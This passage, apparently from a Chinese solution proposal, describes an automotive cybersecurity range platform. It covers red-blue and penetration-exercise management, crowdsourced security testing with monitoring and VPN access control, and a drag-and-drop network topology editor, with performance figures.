拓扑灵活定义，提供多种任务验证类型，包括静态Flag提交、动态Flag提交和报告提交。这使得演练场景可以根据特定需求进行定制，增强了演练的实用性和灵活性。</p></li><li><p>系统支持对防守方任务的定义，用户可以配置防御任务检验的脚本。裁判可以人工研判防御的效果，可以通过定义校验脚本对防御的效果进行校验，同时支持对检测结果进行查看。这有助于全面评估防守方的防御能力。</p></li><li><p>系统允许设计师控制演练的开始和停止，确保演练的有序进行。演练开始后，演练人员可以接入演练环境进行综合演练，实现实时的演练操作和互动。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e35ea9453a1fcf550c041c4a7172ff76.png"></p><p>演练开始和停止</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9e12d875bd3b5153da0e9e8f55ca4710.png"></p><p>进入仿真的场景环境进行综合演练</p><ol start="11"><li><p>系统支持演练环境的批量生成、部署、测试、流量采集和录屏监控功能，以满足复杂的演练需求。同时，系统还支持高层封装的环境需求，自动计算和填充演练环境的参数，提供灵活而高效的环境配置，确保快速准确地部署演练环境。</p></li><li><p>系统提供一键配置功能，自动根据选择的靶标和演练队伍分配适当的环境。该功能通过智能算法和用户界面设计简化演练的准备工作，提高了配置的效率和准确性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a8f46336c44030e536ef139e50fb4890.png" alt="IMG_256"></p><p>一键配置</p><ol start="13"><li><p>系统支持演练前的测试功能，确保演练环境的安全性和稳定性。允许用户进行环境和配置的验证。如果需要重新开始演练，支持重新开始功能以还原演练数据，能够还原初始数据，保证每次演练的数据能够重新开始，而不会受到干扰，确保每次演练的独立性和准确性。这种功能提高了演练的效率和安全性，确保了测试结果的可靠性。</p></li><li><p>系统提供演练的统计功能，可以展示演练队伍的排行，采用top列表的方式，同时可以展示完成任务的情况，采用百分百统计，通过详细的数据分析和报告，提供全面的演练评估，用户可以全面了解各队伍的表现和完成情况，为后续的评估和改进演练提供了有力支持。</p></li><li><p>系统支持配置和分配公共靶标和非公共靶标，通过高级靶标管理系统，为不同类型的演练提供适合的靶标资源，优化靶标的分配和利用效率。</p></li><li><p>系统内置了靶标服务状态的定期检测功能，设计师可以自定义检测周期，并查看各个周期的检测结果，确保靶标服务的连续性和可靠性。这种自动化的检测机制确保了靶标的正常运行，及时发现潜在的问题，为用户提供了一种有效的靶标管理方式。</p></li><li><p>系统支持靶标异常统计功能，允许设计师查看靶标的异常日志，并按队伍和任务进行筛选，查看各队、各任务的情况。这一功能的实现增强了对靶标状态的实时监控，有助于快速识别和响应异常情况。通过分析异常日志，用户可以深入了解问题的根本原因，并进行解决和优化。</p></li><li><p>演练人员能够实时查看成果验证状态，演练开始后任何时间下，设计师则可以进入监控页面查看实时采集和统计的数据，监控各队伍和任务的完成进度和状态，提高演练的透明度和管理效率。这种实时的信息反馈有助于用户及时掌握测试的进展情况，以便进行必要的调整和优化。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/17b9250c85347072bf597a5fec30fc30.png" alt="IMG_256"></p><p>实时查看演练任务的状态和进度</p><ol><li>设计师在演练过程中可随时接入演练环境，进行虚拟机的管理操作，包括虚拟机的重启和重置等操作，也可以做配置、命令等操作，能够通过各种导调手段实现对于场景的仿真，提供灵活的环境控制和调整能力。</li></ol><ol start="20"><li>系统提供手动提前开始和结束演练的功能，支持场景的暂停、恢复和延期操作，增加了演练流程的灵活性和适应性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8f0f9e4fa1b083a2c6dbf0fae00c3bf6.png"></p><ol start="21"><li>系统支持演练的归档功能，对于结束的任务进行数据归档、资源回收，演练任务结束后，系统依据演练数据统计，自动生成全面的统计报告，包括任务完成情况、采集的数据、裁决评分等，支持报告的下载，便于演练数据的保存和分析，确保了演练成果的完整记录和有效利用。</li></ol><h4 id="性能实施方案-10"><a href="#性能实施方案-10" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统支持配置不低于200人参与演练，系统能够处理大规模演练活动，包括演练环境的分配和管理、成果提交和评审、演练过程的统计和监控等功能。</p><h4 id="技术实现内容-10"><a href="#技术实现内容-10" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统提供渗透演练支持，包括顺序闯关和随机闯关两种模式，顺序闯关模式允许演练人员按照渗透训练场景任务顺序完成任务，并实时展示下一任务。在演练过程中，系统支持渗透成果的提交，包括特征码和证据文档等，裁判可对提交的成果进行下载与审核，并给予评价。系统还支持红蓝对抗演练场景的定义，设定红蓝角色及队伍，配置不同的演练任务，并设置演练场景内不同设备的访问权限。在红蓝对抗中，系统能够根据周期为双方计算积分，并支持演练中统计红蓝队伍和演练人员的得分，涵盖攻击得分、防守得分、异常检测扣分等。</p><p>系统还支持蓝方靶标状态的周期性检测，可配置检测内容与脚本，参数包括周期、指令、参数、系统等。蓝方可以提交防御报告，裁判对此进行审核与评分。系统支持综合演练场景的网络拓扑灵活定义，设置多种任务验证类型，包括静态Flag提交、动态Flag提交及报告提交。综合演练还支持防御方任务的定义，配置防御任务检验脚本，裁判可以人工研判防御效果，通过定义校验脚本对防御效果进行校验，并查看检测结果。</p><p>系统允许设计师控制演练的开始和停止，在开始后，演练人员可接入演练环境进行综合演练。系统支持演练环境的批量生成、部署、测试、流量采集、录屏监控等功能，并支持环境需求的高层封装，自动计算并填充部署所需参数。系统还支持演练相关要素的一键配置，展示配置的进度及结果，根据选择的靶标和演练队伍自动进行环境分配。此外，系统提供演练前测试功能，能够还原演练数据，并支持统计包含演练队伍排行、任务完成情况等。</p><p>系统支持公共靶标和非公共靶标的配置与分配，定期检测靶标服务状态，并展示各周期检测结果。提供靶标异常统计，设计师可查看异常日志，并按队伍和任务筛选。系统支持演练人员提交成果验证状态的实时查看，设计师可查看各队伍、各任务的完成进度与状态。设计师可随时接入演练环境，对虚拟机进行管理，包含重启、重置等功能。系统提供演练的手动提前开始、结束功能，支持场景的暂停、恢复及延期，并提供演练的归档功能，自动生成全面统计报告并提供下载。</p><p>性能参数为，系统支持配置200人同时开展演练。</p><p>提供一个全面的渗透演练平台，用于支持网络安全专业人员和团队进行渗透测试训练和红蓝对抗演习。平台将提供多种演练模式，支持成果提交与审核，红蓝对抗的定义和积分系统，以及灵活的网络拓扑设计和环境控制。该方案将满足至少200人同时开展演练的性能要求。</p><h5 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h5><p>演练模式支持</p><p>顺序闯关模式：允许演练人员按照预设的任务顺序进行渗透测试，完成一个任务后实时展示下一个任务。平台将提供相应的功能截图以证明此功能。</p><p>随机闯关模式：演练人员可以随机选择任务进行渗透测试。</p><p>成果提交与审核</p><p>成果提交：演练人员可提交特征码、证据文档等成果。</p><p>成果审核：裁判可以下载并审核提交的成果，并给予评价。</p><p>红蓝对抗场景定义</p><p>角色设定：定义红蓝双方角色及队伍，配置不同的演练任务。</p><p>访问权限设置：设置演练场景内不同设备的访问权限。</p><p>对抗积分系统</p><p>周期性对抗：根据预设周期计算红蓝双方积分。</p><p>得分统计：统计攻击得分、防守得分、异常检测扣分等。</p><p>靶标状态检测</p><p>周期性检测：配置周期性检测靶标状态的内容和脚本。</p><p>检测参数配置：包括周期、指令、参数、系统、协议、端口等。</p><p>防御报告提交与审核</p><p>报告提交：蓝方可以提交防御报告。</p><p>报告审核：裁判审核报告并给予评分。</p><p>网络拓扑与任务验证</p><p>网络拓扑定义：灵活定义综合演练场景的网络拓扑。</p><p>任务验证类型：支持多种任务验证类型。</p><p>演练控制与环境管理</p><p>演练控制：设计师可控制演练的开始与停止。</p><p>环境接入：演练人员可接入演练环境进行综合演练。</p><p>环境部署与配置</p><p>批量环境管理：支持环境的批量生成、部署、测试等。</p><p>一键配置：支持演练相关要素的一键配置。</p><p>演练测试与统计</p><p>演练前测试：支持演练前的测试功能。</p><p>统计功能：包含演练队伍排行及任务完成情况统计。</p><p>靶标管理与检测</p><p>靶标配置：支持公共和非公共靶标的配置与分配。</p><p>服务状态检测：提供定期检测靶标服务状态。</p><p>成果与进度管理</p><p>成果验证查看：实时查看演练人员提交成果验证状态。</p><p>进度监控：设计师可查看各队伍、各任务的完成进度。</p><p>虚拟机管理</p><p>虚拟机操作：设计师可对虚拟机进行管理，包括重启、重置等。</p><p>演练流程控制</p><p>手动控制：提供演练的手动开始、结束以及场景控制功能。</p><p>演练归档</p><p>归档与报告：演练结束后，自动生成统计报告并提供下载。</p><p>参与人数：平台支持不低于200人同时开展演练。</p><p>预期结果</p><p>提供一个高性能、可靠的渗透演练平台。</p><p>支持大规模的红蓝对抗演练。</p><p>提高演练人员的渗透测试能力和团队协作效率。</p><p>汽车安全演练模块主要为系统提供攻防演练业务支撑，该模块提供一个仿真的网络运行状态隔离的、安全可控的演练网络环境。基于该子系统，从事网络与信息安全相关试验的研究机构可以快速建立各种场景的演练测试环境，在网络层、主机层、应用层等各个层面上进行安全技术研究，开展相关的网络与信息安全攻防演练，同时提供的过程监控工具，可以对所进行的演练进行分析评估。</p><p>支持复杂网络拓扑模拟，具备实时监控与评估各组攻防态势的能力。主要包括演练场景的设计和配置，用于与演练并进行结果提交等相关操作。演练场景管理包括演练前配置、演练中监控与查看、演练结束后的归档与报告。演练前的配置包括演练人员配置、接入机器配置、靶标配置、演练任务配置、异常检测等几个方面。演练中主要包括队伍人员靶标得分统计、靶标服务异常检测展示、演练通知消息发送以及大屏展示。演练后主要包括演练的得分排名、演练报告查看等，主要为用户提供攻防演练的服务。演练能够并行开展多个场景，支持模板管理功能，可基于模板快速的生成演练环境以及完成演练场景的相关配置。</p><p>靶场支持实验人员接入环境内虚拟终端。教员可查看学员的在线状态，查看接入虚拟终端运行状态。监控数据通过web方式接入，可对接入终端通过检测项来确认开放端口、网络可达，是否接入等信息，检测结果可导出。</p><h5 id="攻防演练类型"><a href="#攻防演练类型" class="headerlink" title="攻防演练类型"></a>攻防演练类型</h5><p>系统支持红蓝对抗、渗透闯关、综合演练、护网演练等多种演练场景的设计与部署。</p><p>红蓝对抗：设计师在一个实验环境内将实验员分为红蓝两队。攻击队伍利用对逆向、漏洞挖掘、Web渗透等工具对靶标进行攻破。最后拿到靶标的动态flag上传系统来证明已经攻破。</p><p>渗透演练：在渗透演练中，攻击队伍不清楚靶标漏洞情况，需要利用网络知识和漏洞扫描结果进行合理推断，获得对网络和靶标的了解，最终利用多种工具攻破靶标。</p><p>综合演练系统具备以下功能：支持多样的拓扑结构，可灵活配置靶标验证方式； 提供任务分配功能，支持静态flag和动态flag；支持定义训练过程中的任务、设置和分配靶标，并配置人员队伍；提供靶标服务的检测功能；用户可提交训练结果，并监控训练过程；支持查询人员队伍得分，发送公告和通知；提供可视化展示功能； 在训练结束后，支持释放系统资源和归档训练数据。</p><h5 id="演练场景管理"><a href="#演练场景管理" class="headerlink" title="演练场景管理"></a>演练场景管理</h5><p>攻防演练场景管理主要提供渗透闯关、红蓝对抗、综合演练、护网演练等类型场景的管理功能。提供演练前配置、演练中监控与控制、演练后归档与统计的管理功能。场景管理用于对场景内容的定义，包括场景的基本描述、场景的网络环境、场景的任务步骤、场景的人员角色、场景的接入配置等内容。可以经设计好的场景转成模板，供演练子系统复用。攻防场景设计管理包括新增、删除、修改系统中的攻防场景。</p><h6 id="场景前配置"><a href="#场景前配置" class="headerlink" title="场景前配置"></a>场景前配置</h6><p>在演练开始之前的场景前配置是确保演练顺利开展的重要环节，其内容会根据不同的演练场景而有所变化。这项准备工作通常涉及设定参与的队伍和演练人员，以及他们所使用的接入机器和目标系统（靶标）。同时，还需要配置Flag的更新机制来保证演练的连续性和监管性，包括流量过滤规则来确保网络安全和异常检测机制以及时发现并处理潜在的风险或攻击行为。这些步骤共同构成了演练的基础框架，是演练能够按计划执行的关键。</p><h6 id="演练中管理"><a href="#演练中管理" class="headerlink" title="演练中管理"></a>演练中管理</h6><p>演练进行过程中，设计师可对演练进程进行控制，包含开始、暂停、恢复、结束、延迟演练。支持演练的重新开始，还原一个初始的演练。</p><p>支持试验任务的调度管理与进度管理，支持训练整体导调的开始、暂停、恢复、结束、初始化等操作，此外还支持试验清空，并保存为模板。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14fda5384dbc0577dff2c9ad90973c9a.png"></p><p>演练进度步骤管理</p><h6 id="演练后归档"><a href="#演练后归档" class="headerlink" title="演练后归档"></a>演练后归档</h6><p>支持演练场景按照设定的时间自动开始与结束，并支持演练设计人员手动开始与结束演练。演练后，能够对演练的资源进行释放，并查看最后的得分详情，包括个人积分、团队积分，攻击得分，防守失分，异常失分等。设计师能查看队伍的排名，并能查看自动生成演练报告。</p><h3 id="汽车安全众测模块"><a href="#汽车安全众测模块" class="headerlink" title="汽车安全众测模块"></a>汽车安全众测模块</h3><h4 id="功能实施方案-11"><a href="#功能实施方案-11" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）系统提供了完整的众测活动管理功能，支持用户设定众测的名称、时长和内容，设计师具备发布众测活动的管理权限。这包括详细定义众测活动的关键参数，包括名称（用于唯一标识众测项目）、持续时间（规定众测活动的时间跨度）以及测试内容（明确众测的具体任务和要求），支持众测活动是否发布，确保众测活动能按计划进行并满足预期要求。</p><p>2） 在众测过程中，系统允许渗透测试成果的提交，其中包括特征码和证据文档等关键信息。众测人员可以上传包括特征码、证据文档在内的成果，供裁判进行下载与审核，并获得相应的评价。裁判拥有审查众测人员提交成果的权限，可以下载和审核这些材料，并提供相应的评价。这种机制确保了测试成果的有效性和可靠性，提高了测试的评估价值。</p><p>3） 系统具备监控和录屏众测人员在动态测试接入网关上操作的能力，通过实时监控和录屏保存技术，实现了测试过程的可追溯性和安全性，确保众测活动的安全性和合规性，监督众测人员的行为，以防止潜在的违规行为，并维护活动的整体安全性，提供了对测试人员操作的审计功能。</p><p>4） 众测模式支持两种访问方式，即内部和外部。内部众测采用内网访问方式，测试人员直接接入内部网络；而外部众测则通过配置和提供VPN账号的方式实现接入访问，以防止非受控的人员进入。系统具备对VPN访问的通断控制功能，能够控制众测人员的网络接入和通断，以确保系统访问的安全性和合规性。</p><p>5） 系统允许允许设计师对众测过程进行全程控制，提供了设计师掌控众测活动的启动和终止的功能。一旦活动开始，众测人员即可进入众测环境，展开全面的综合众测。结合动态测试接入网关，众测模式支持对被测对象的蓝牙、WiFi、CAN、USB调试接口进行渗透测试，提供了各种接口的接入设备，能够提供便捷的被测对象接口对接和测试访问，支持灵活定义的众测测试环境。</p><p>6） 系统支持实时查看众测人员提交的成果验证状态，并提供了对各队伍、各任务完成进度与状态的实时数据采集、处理和查看功能，支持设计师监控各个队伍和任务的完成进度和状态，通过导调控制保障众测活动的顺利进行。</p><p>7） 设计师具备随时接入众测环境的权限，以对动态测试接入网关进行管理，包括执行重启和重置等关键操作，以确保众测活动的稳定性和有效性。这种实时的环境控制能力提高了测试过程中的应变能力和灵活性，有助于确保测试的顺利进行。</p><p>8） 系统具备手动提前开始和手动提前结束众测的功能，同时支持在众测过程中对活动进行暂停、恢复以及延期的操作，以满足不同情境下的需求。这为设计师提供了更灵活的控制选项，以确保众测活动能够适应各种变化和应急情况。</p><p>9） 系统支持众测结果的归档，众测活动结束后，系统依据众测的过程数据采集和统计，自动生成详尽的统计报告。报告内容涵盖了测试过程中的各种数据和结果分，并提供报告下载功能，供进一步分析和审查。这种自动化的报告生成机制减轻了设计师的工作负担，提高了测试结果的处理效率。</p><p>10） 系统能够与漏洞平台实现数据同步，确保众测结果与漏洞平台的数据保持一致，使众测成果能够无缝地与漏洞管理过程相结合。通过数据同步，系统可以获取最新的漏洞信息和安全情报，为测试提供更准确和全面的数据支持。这种功能提高了测试的时效性和针对性，有助于发现更多的安全问题并及时进行处理。</p><h4 id="性能实施方案-11"><a href="#性能实施方案-11" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统支持配置不低于60人参与众测活动，具备有效处理多用户同时参与众测的能力，包括资源分配和性能管理等关键功能。</p><p>2） 系统支持在同一时刻至少允许每套动态测试接入网关接入不低于3人，同时能够处理多个测试请求，从而保障了系统的性能和稳定性。</p><h4 id="技术实现内容-11"><a href="#技术实现内容-11" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>安全众测服务模块是围绕漏洞生态体系打造的集漏洞情报、漏洞挖掘、专家响应、安全服务定制化于一体的综合性安全服务平台，开创众测新时代时代，重塑众测新业态。模块通过打造“人员可信，全程可视，风险可控，行为可阻，违规可溯”的五可理念，以攻击者思维，在安全可控的场景下，由经验丰富的安全专家模拟黑客对业务系统进行全面深入的安全测试，为客户提供高价值的安全众测服务。</p><p>人员可信：模块实行非开放注册制，任何一名加入平台的安全研究人员均需提交个人信息，通过技术靶场检验，严格的背景调查及合同签署审核认证等机制，确保平台人员的身份可信、技能优越。</p><p>全程可视：众测系列服务全程接入监控产品进行可视化支撑，通过对流量数据的监测分析及数据间的关联关系判断，识别当前动作所处攻击环节，同时定位攻击发起时间、攻击利用位置、攻击源等信息，对测试动作进行还原描绘，按照攻击链理论将测试动作映射到攻击链模型上，形成完整攻击链的可视，使安全服务过程“实战化 ”呈现。</p><p>风险可控：众测创新技术突破，是拥有全过程全流量监测分析能力的众测服务平台，可以对http、https进行全流量分析，全过程无死角，攻击过程大屏可视化展示。根据客户要求设置项目加入限制，并结合法律法规以确保正确开展工作。</p><p>行为可阻：众测利用账户权限管理，对安全研究人员的临时项目测试账号进行严格管控，配合行为审计系统，一但发现测试过程中存在恶意、违规行为，将立即撤销测试账号权限，从而阻断测试通道防止产生后续损失，并永久取消其项目参与资格。</p><p>违规可溯：在测试过程中，众测通过技术手段对测试动作进行实时全流量捕获，形成审计日志，可进行溯源、实时反溯查处，平台所记录日志将遵循安全记录，永久保密的原则，且仅供客户及监管单位进行审计使用。</p><h5 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h5><p>针对企业对风险感知的需求，挑选相对应技术领域顶尖白帽精英，提供不设任何限制条件的网络安全攻击对抗服务。</p><h5 id="众测"><a href="#众测" class="headerlink" title="众测"></a>众测</h5><p>企业可随时根据业务计划或预算进行调整，根据实际情况众测模块为企业量身挑选15～50名最擅长该领域的精英白帽，定制专属的安全测试团队，提供漏洞挖掘服务。</p><h5 id="新测"><a href="#新测" class="headerlink" title="新测"></a>新测</h5><p>企业新业务上线前检测，全方位探知业务漏洞，防范新业务引入新风险，构建业务运营推广前的最后一道检验防线，从而提升开发人员安全意识，完善组织规范。</p><h5 id="专测"><a href="#专测" class="headerlink" title="专测"></a>专测</h5><p>认证的白帽专家深入行业/地域业务，根据客户需求，指定安全专家进行常态性、周期型的跟踪漏洞挖掘服务，在不增加用户风险的情况下，大幅度提升安全测试效果。</p><h5 id="常测"><a href="#常测" class="headerlink" title="常测"></a>常测</h5><p>安全专家结合自动化工具，常态化定期对目标进行漏洞检测，风险监测，漏洞预警，持续化关注安全风险态势。对发现的漏洞问题可不断的修正，直到处于风险可接受的范围内，极大降低了因安全缺陷导致的隐患与负面影响。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/64e5283ee7570f3d006d628236fe04ed.png" alt="IMG_256"></p><p>众测模块流程</p><h3 id="试验场景设置模块"><a href="#试验场景设置模块" class="headerlink" title="试验场景设置模块"></a>试验场景设置模块</h3><h4 id="功能实施方案-12"><a href="#功能实施方案-12" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 系统采用基于HTML5、CSS3和JavaScript等技术的图形用户界面，支持用户采用拖拽式设计方式构建目标网络的拓扑设置，允许用户对网络设备、主机设备、车端设备、测试工具等虚实目标网络环境进行统一配置，并且支持多种便捷编辑方式，支持共享编辑，能够分配多个用户能够共享编辑一个拓扑场景，每人做其中一部分；支持多层级网络编辑，分别编辑拓扑中的二级、三级网络，各个子网等；支持批量节点快速复制，通过鼠标框选多个节点后，就能快速批量复制这部分的节点；支持模板组合编辑，能够将多个模板的拓扑组合到同一个大拓扑中。此外，提供工具箱，工具箱包括不限于以下工具：提供鹰眼功能，快速查看整个拓扑的全局形态；提供编组对齐，自动依据客户设定的基准线对齐节点排布；提供操作记录撤回，能够撤回3步之内的拓扑设计编辑操作；提供批量修改，能够批量修改节点的模版、配置、网络等。系统还支持通过镜像线的方式对汽车网络中需要旁路接收指定节点流量的设备进行设计和配置，通过在拓扑中，新增连接镜像线，设定需要采集流量数据的点，配置后系统自动完成数据采集所需的组网配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8a4e923b486dd76d487d16d131584e56.png"></p><p>拖拽式的网络拓扑编辑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b1af5f81d31c880653229f0e4d7df9ff.png"></p><p>对齐和鹰眼功能</p><p>2） 目标网络环境的网络拓扑编辑界面支持树形展示，采用树形展示方式，用户可以方便地查找和定位节点。系统提供了快速查找和定位节点的能力，并在拓扑图中突出显示节点的位置，并查找的节点在网络拓扑中的位置进行突出显示，使拓扑编辑更加直观和便捷。</p><p>3） 用户能够在编辑界面利用虚拟机名称进行搜索，并迅速定位到搜索结果中的特定虚拟机，以实现快速而准确的虚拟机定位。用户能够更加便捷地管理和操作虚拟机资源。</p><p>4） 支持目标网络拓扑的鹰眼展示，用户可以随意放大和缩小拓扑图，并且鹰眼窗口会自动跟随展示的拓扑位置移动，以确保用户始终能够全面查看整个网络拓扑，方便用户对整个网络拓扑的快速查看和定位。</p><p>5） 拓扑编辑功能支持网络拓扑图的滚动式缩放和分层式节点聚合，同时提供网络环境的目录展示，用户可以快速查找和定位节点，以及基于目录进行子网络的跳转和返回。</p><p>6） 拓扑编组对齐工具提供设备的编组和解除编组功能，用户可以根据需要对多个设备进行上对齐、下对齐、左对齐、右对齐、水平居中对齐、垂直居中对齐、水平平均分布、垂直平均分布等操作，并且支持配置分组颜色以区分不同的设备组。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ba092319edd5c7bf2ab599093e5071e3.png" alt="IMG_256"></p><p><strong>编组、解除编组、颜色配置分组对齐</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/712f922bba80653f0e5201a0b98700ed.png" alt="IMG_256"></p><p><strong>从左左到右，从上往下，依次是左对齐、上对齐、右对齐、水平居中对齐、垂直居中对齐、水平平均分布、垂直平均分、下对齐、均匀分布</strong></p><p>7） 在拓扑编辑界面，用户可进行虚拟设备的多选操作，以便同时编辑多个虚拟设备的位置和配置，提高了虚拟设备管理的效率和便捷性。</p><p>8） 在拓扑编辑界面，系统展示虚拟机连线相关端口的两端IP地址，帮助用户清晰地了解设备之间的通信情况，满足用户设计和管理网络拓扑。</p><p>9） 在网络拓扑界面，用户可以轻松查看节点和子网的属性，包括部署情况和端口情况，以便设计和有效管理网络拓扑，有助于用户深入了解网络拓扑的结构和属性。</p><p>10）系统具备操作记录撤回功能，支持网络节点位置记录和配置记录的撤回，包括拓扑修改和节点配置修改，用户可以回溯之前的修改操作，并支持记录拓扑修改和节点配置修改的撤销，支持撤回步数不少于5步，提高了编辑操作的灵活性和准确性。</p><p>11）系统支持将整个场景拓扑或者区域子网络拓扑保存成模板，并且能够利用多个模板快速组合设计网络。此外，用户可以将模板导出成json格式文件进行保存，便于模板的共享和重复使用。场景模板的导入支持严格校验模板配置，也支持仅导入拓扑结构，为用户提供了更多样的模板使用方式。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f4c439c5dd3e8b333deb08d4662a99ae.png" alt="企业微信截图_17035379883155"></p><p>场景拓扑或者区域子网络拓扑保存成模板</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5a9600e355f1888e76fd05213be8cef1.png" alt="企业微信截图_17035380017066"></p><p>利用多个模板快速组合设计网络</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/15611232d42a09f7af1a83fd99aedc42.png" alt="1703511598819"></p><p>json格式文件导出</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/82e2eca23ec3d96754f5e50e13b59821.png" alt="1703511631371"></p><p>模板导入</p><ol><li>系统支持设备复制的功能实现已配置设备的快速配置，复制的设备支持自动配置连线、设备名称、IP等信息，提高了设备配置的效率和准确性。</li><li>系统支持通过集群的方式实现利用主机模型批量创建多个类似的虚拟主机，批量创建的虚拟主机支持自动配置设备名称、IP等信息。单个集群支持批量创建的虚拟主机数量不低于1000个，满足大规模虚拟主机的创建和管理需求。此外，该模块还支持批量对主机的配置进行修改，修改的信息包括虚拟机镜像、配额、IP等属性，简化了批量修改操作的过程。</li></ol><h4 id="性能实施方案-12"><a href="#性能实施方案-12" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统支持大规模拓扑的设计，单一拓扑支持不低于5000节点配置能力，满足大规模网络环境的需求。同时，它支持的网络嵌套层级不低于3层，单个网络场景内子网络数量不低于100个，隔离网络数量不低于1000个，提供丰富的网络层次和隔离配置选项。</p><p>2） 系统支持同时配置的网络场景数量不低于200个，大大提高了网络配置的效率和灵活性，能够满足用户在多场景下的测试需求。</p><h4 id="技术实现内容-12"><a href="#技术实现内容-12" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统采用拖拽式设计方式对网络设备、主机设备、车端设备和测试工具等虚实目标网络环境进行统一配置。功能包括共享编辑、多层级网络编辑、批量节点快速复制和模板组合编辑，同时提供鹰眼、编组对齐、操作记录撤回和批量修改等工具箱提高设计效率。</p><p>系统通过镜像线方式对汽车网络中旁路接收指定节点流量的设备进行配置。目标网络环境的网络拓扑编辑支持树形展示，能快速定位节点，并在网络拓扑中突出显示查找节点。</p><p>系统在编辑界面支持利用虚拟机名称搜索并定位虚拟机，目标网络拓扑鹰眼展示支持拓扑放大缩小，鹰眼窗口随屏幕展示的拓扑位置移动。拓扑编辑还支持网络拓扑图的滚动式缩放和分层式节点聚合，提供快速查找定位节点能力，支持基于目录的子网络跳转和返回。拓扑编组对齐工具提供设备的编组和解除编组功能，支持分组颜色配置，多个设备的对齐和分布操作。</p><p>系统支持在拓扑编辑界面的虚拟设备多选，进行多个虚拟设备位置移动，展示虚拟机连线相关端口的两端IP地址。网络拓扑界面可查看节点、子网属性，包括部署情况、端口情况。操作记录撤回支持网络节点位置和配置记录，记录拓扑修改和节点配置修改，支持配置操作撤回，撤回步数不少于5步。</p><p>系统支持将整个场景拓扑或区域子网络拓扑保存成模板，支持多个模板快速组合设计网络，模板导出成json格式文件。场景模板导入支持严格校验模板配置或仅导入拓扑结构。模块支持设备复制功能，复制的设备自动配置连线、设备名称、IP等信息。</p><p>系统通过集群方式批量创建类似虚拟主机，支持批量创建的虚拟主机自动配置设备名称、IP等信息，单个集群支持批量创建数量1000个；支持批量对主机配置进行修改，修改信息包括虚拟机镜像、配额、IP等属性。</p><p>性能参数为，系统支持大规模拓扑设计，单一拓扑支持5000节点配置能力，网络嵌套层级为3层，单个网络场景内子网络数量为100个，隔离网络数量为1000个。系统支持同时配置的网络场景数量为200个。</p><h5 id="方案设计-1"><a href="#方案设计-1" class="headerlink" title="方案设计"></a>方案设计</h5><p>目标网络设置</p><p>本系统将采用拖拽式设计方式，能够对网络设备、主机设备、车端设备、测试工具等虚实目标网络环境进行统一配置。系统将支持共享编辑、多层级网络编辑、批量节点快速复制、模板组合编辑等多种便捷编辑方式，并提供鹰眼、编组对齐、操作记录撤回、批量修改等多种便捷工具箱提高目标网络设计效率。此外，系统支持通过镜像线的方式对汽车网络中需要旁路接收指定节点流量的设备进行设计和配置。</p><p>2. 网络拓扑编辑功能</p><p>目标网络环境的网络拓扑编辑将支持网络环境的树形展示，提供树形分支节点的快速查找定位节点的能力，能够对查找的节点在网络拓扑中的位置进行突出显示。系统还支持在编辑界面利用虚拟机名称搜索并定位搜索到的虚拟机；支持目标网络拓扑鹰眼展示，支持拓扑展示的放大缩小，鹰眼窗口能够随着屏幕展示的拓扑位置跟随移动。拓扑编辑支持网络拓扑图滚动式缩放及分层式节点聚合，支持网络环境的目录展示，提供快速查找定位节点的能力，以及基于目录进行子网络的跳转和返回。</p><p>3. 拓扑编组对齐与多选功能</p><p>拓扑编组对齐工具将提供设备的编组和解除编组能力，并提供分组颜色的配置，能够对多个设备进行上对齐、下对齐、左对齐、右对齐、水平居中对齐、垂直居中对齐、水平平均分布、垂直平均分布操作。此外，系统支持在拓扑编辑界面的虚拟设备多选，进行多个虚拟设备在编辑界面位置移动。</p><p>4. 